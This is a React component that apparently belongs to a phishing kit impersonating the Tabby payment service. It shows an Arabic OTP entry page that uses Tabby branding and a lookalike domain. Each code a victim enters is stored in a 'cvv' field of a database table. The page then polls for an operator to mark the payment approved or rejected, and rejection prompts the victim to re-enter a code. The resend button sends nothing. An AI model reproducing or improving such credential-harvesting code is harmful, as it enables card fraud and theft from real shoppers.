import { useState, useRef, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronRight, CheckCircle, XCircle } from "lucide-react";
import tabbyLogo from "@/assets/tabby-logo.png";
import { supabase } from "@/integrations/supabase/client";
const loadingMessages = ["جاري الدفع", "جاري المعالجة", "جاري التحقق"];
const TabbyOtpVerification = () => {
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const price = searchParams.get("price") || "0";
  const company = searchParams.get("company") || "";
  const phone = searchParams.get("phone") || "";
  const cardLast4 = searchParams.get("cardLast4") || "";
  const paymentId = searchParams.get("paymentId");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const timeoutRef = useRef<NodeJS.Timeout | null>(null);
  const [verificationStatus, setVerificationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
  const [messageIndex, setMessageIndex] = useState(0);
  useEffect(() => {
    // Focus first input on mount
    inputRefs.current[0]?.focus();
  }, []);
  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(0, 1);
    }
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };
  const handleVerify = async () => {
    const otpCode = otp.join("");
    console.log("handleVerify called", { otpCode, isOtpComplete, paymentId });
    if (!isOtpComplete || !paymentId) {
      console.log("Verification blocked:", { isOtpComplete, paymentId });
      return;
    }

    // Clear any existing intervals
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
      pollIntervalRef.current = null;
    }
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
    }
    setVerificationStatus("loading");
    try {
      // Update OTP code in database
      const {
        error: updateError
      } = await supabase.from("tabby_payments").update({
        cvv: otpCode
      }).eq("id", paymentId);
      if (updateError) {
        console.error("Error updating OTP:", updateError);
        setVerificationStatus("idle");
        setOtp(["", "", "", ""]);
        inputRefs.current[0]?.focus();
        return;
      }

      // Poll for payment status every 1 second
      pollIntervalRef.current = setInterval(async () => {
        try {
          const {
            data: statusData,
            error: statusError
          } = await supabase.from("tabby_payments").select("payment_status").eq("id", paymentId).single();
          if (statusError) {
            console.error("Error polling status:", statusError);
            return;
          }
          console.log("Payment status:", statusData.payment_status);
          if (statusData.payment_status === "approved") {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            if (timeoutRef.current) clearTimeout(timeoutRef.current);
            setVerificationStatus("success");
            setTimeout(() => {
              navigate(`/tabby-payment?paymentId=${paymentId}&price=${price}&company=${company}`);
            }, 1500);
          } else if (statusData.payment_status === "rejected") {
            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
            if (timeoutRef.current) clearTimeout(timeoutRef.current);
            setVerificationStatus("error");
            setTimeout(() => {
              setVerificationStatus("idle");
              setOtp(["", "", "", ""]);
              inputRefs.current[0]?.focus();
            }, 2000);
          }
        } catch (pollError) {
          console.error("Polling error:", pollError);
        }
      }, 1000);

      // Timeout after 30 seconds - return to idle if no response
      timeoutRef.current = setTimeout(() => {
        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
        setVerificationStatus("error");
        setTimeout(() => {
          setVerificationStatus("idle");
          setOtp(["", "", "", ""]);
          inputRefs.current[0]?.focus();
        }, 2000);
      }, 30000);
    } catch (error) {
      console.error("OTP verification error:", error);
      setVerificationStatus("idle");
      setOtp(["", "", "", ""]);
      inputRefs.current[0]?.focus();
    }
  };
  const handleResendOtp = () => {
    console.log("Resend OTP to:", phone);
    setOtp(["", "", "", ""]);
    inputRefs.current[0]?.focus();
  };

  // Rotate loading messages
  useEffect(() => {
    if (verificationStatus === "loading") {
      const interval = setInterval(() => {
        setMessageIndex(prev => (prev + 1) % loadingMessages.length);
      }, 1700);
      return () => clearInterval(interval);
    }
  }, [verificationStatus]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, []);
  const isOtpComplete = otp.every(digit => digit !== "");

  // If showing loading, success, or error screen
  if (verificationStatus !== "idle") {
    return <div className="min-h-screen bg-[#F8F9FA] flex items-center justify-center p-4" dir="rtl">
        <div className="max-w-md w-full">
          {/* Tabby Logo */}
          <div className="flex justify-center mb-8">
            <div className="w-32 h-12 flex items-center justify-center">
              <img src={tabbyLogo} alt="تابي" className="w-full h-full object-contain" />
            </div>
          </div>

          {/* Main Card */}
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <div className="flex flex-col items-center justify-center min-h-[300px]">
              {verificationStatus === "loading" && <>
                  <div className="relative w-24 h-24 mb-6">
                    <div className="absolute inset-0 border-4 border-[#22C55E] border-t-transparent rounded-full animate-spin"></div>
                    <div className="absolute inset-2 border-4 border-[#3CDBC0] border-t-transparent rounded-full animate-spin" style={{
                  animationDirection: 'reverse',
                  animationDuration: '1s'
                }}></div>
                  </div>
                  <p className="text-xl font-bold text-center mb-2 animate-fade-in">
                    {loadingMessages[messageIndex]}
                  </p>
                  <p className="text-sm text-muted-foreground text-center">
                    يرجى الانتظار، لا تغلق هذه النافذة
                  </p>
                </>}

              {verificationStatus === "success" && <>
                  <div className="w-24 h-24 mb-6 bg-green-100 rounded-full flex items-center justify-center animate-scale-in">
                    <CheckCircle className="w-16 h-16 text-green-600" />
                  </div>
                  <p className="text-xl font-bold text-center text-green-600 mb-2">
                    تم التحقق بنجاح!
                  </p>
                  <p className="text-sm text-muted-foreground text-center">
                    جاري تحويلك لصفحة إتمام العملية...
                  </p>
                </>}

              {verificationStatus === "error" && <>
                  <div className="w-24 h-24 mb-6 bg-red-100 rounded-full flex items-center justify-center animate-scale-in">
                    <XCircle className="w-16 h-16 text-red-600" />
                  </div>
                  <p className="text-xl font-bold text-center text-red-600 mb-2">
                    رمز التحقق غير صحيح
                  </p>
                  <p className="text-sm text-muted-foreground text-center">
                    يرجى إعادة إدخال الرمز الصحيح...
                  </p>
                </>}
            </div>

            {/* Payment Details */}
            <div className="mt-8 pt-6 border-t-2 border-gray-100">
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">الشركة:</span>
                  <span className="font-medium text-xs">{company}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">البطاقة:</span>
                  <span className="font-medium">**** **** **** {cardLast4}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">المبلغ الإجمالي:</span>
                  <span className="font-bold text-lg">{price} ر.س</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>;
  }
  return <div className="min-h-screen bg-[#F8F9FA]" dir="rtl">
      <div className="max-w-[480px] mx-auto bg-white min-h-screen">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-gray-200">
          <button onClick={() => navigate(-1)} className="flex items-center gap-2 text-[#3CDBC0] hover:text-[#2fc4aa] transition-colors text-sm font-medium">
            <ChevronRight className="w-4 h-4" />
            العودة إلى المتجر
          </button>
          <button className="text-sm text-blue-600 hover:text-blue-700 transition-colors">
            English
          </button>
        </div>

        {/* Store Name and Tabby Logo */}
        <div className="text-center py-6 border-b border-gray-100">
          
          <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
            <span>الدفع بواسطة</span>
            <img src={tabbyLogo} alt="تابي" className="h-5 object-contain" />
          </div>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-6 py-8 px-8">
          <div className="w-10 h-10 rounded-lg border-2 border-[#22C55E] flex items-center justify-center bg-[#22C55E]">
            <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none">
              <path d="M5 13l4 4L19 7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          <div className="flex-1 h-[2px] bg-[#22C55E]"></div>
          <div className="w-10 h-10 rounded-lg border-2 border-[#22C55E] flex items-center justify-center bg-white">
            <svg className="w-5 h-5 text-[#22C55E]" viewBox="0 0 24 24" fill="none">
              <rect x="3" y="6" width="18" height="13" rx="2" stroke="currentColor" strokeWidth="2" />
              <path d="M3 10h18" stroke="currentColor" strokeWidth="2" />
            </svg>
          </div>
          <div className="flex-1 h-[1px] bg-gray-300"></div>
          <div className="w-10 h-10 rounded-lg border border-gray-300 flex items-center justify-center bg-white">
            <svg className="w-5 h-5 text-gray-400" viewBox="0 0 24 24" fill="none">
              <path d="M9 12l2 2 4-4m6 2a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
        </div>

        {/* Hero Image */}
        <div className="px-8 mb-8">
          <div className="w-full rounded-2xl overflow-hidden shadow-md">
            <img src="https://tabby.sallapayment.store/assets/auth-image.png" alt="Tabby" className="w-full h-auto object-cover" onError={e => {
            e.currentTarget.style.display = 'none';
            e.currentTarget.parentElement!.classList.add('aspect-[16/9]', 'bg-gradient-to-br', 'from-orange-100', 'to-orange-200');
          }} />
          </div>
        </div>

        {/* Content */}
        <div className="px-8">
          <h1 className="text-2xl font-bold text-center mb-3 text-gray-900">
            أدخل رمز التحقق
          </h1>
          <p className="text-center text-gray-600 mb-2 text-sm">
            تم إرسال رمز التحقق إلى
          </p>
          <p className="text-center text-gray-900 font-medium mb-8 text-sm" dir="ltr">
            +966{phone}
          </p>

          {/* OTP Input */}
          <div className="flex justify-center gap-3 mb-6" dir="ltr">
            {otp.map((digit, index) => <input key={index} ref={el => inputRefs.current[index] = el} type="tel" maxLength={1} value={digit} onChange={e => handleOtpChange(index, e.target.value)} onKeyDown={e => handleKeyDown(index, e)} className="w-14 h-14 border-2 border-gray-300 rounded-lg text-center text-xl font-semibold outline-none focus:border-[#22C55E] focus:ring-2 focus:ring-[#22C55E]/20 transition-all" />)}
          </div>

          {/* Resend OTP */}
          <div className="text-center mb-6">
            <button onClick={handleResendOtp} className="text-[#22C55E] hover:text-[#16A34A] text-sm font-medium transition-colors">
              إعادة إرسال الرمز
            </button>
          </div>

          {/* Verify Button */}
          <button onClick={handleVerify} disabled={!isOtpComplete} className="w-full bg-[#22C55E] hover:bg-[#16A34A] disabled:bg-gray-200 disabled:text-gray-400 text-white font-semibold py-3.5 rounded-lg transition-all text-base">
            تحقق
          </button>

          {/* Order Info */}
          <div className="text-center text-xs text-gray-500 mt-8 space-y-1">
            <p>قيمة الطلب: {price} ر.س</p>
          </div>
        </div>
      </div>
    </div>;
};
export default TabbyOtpVerification;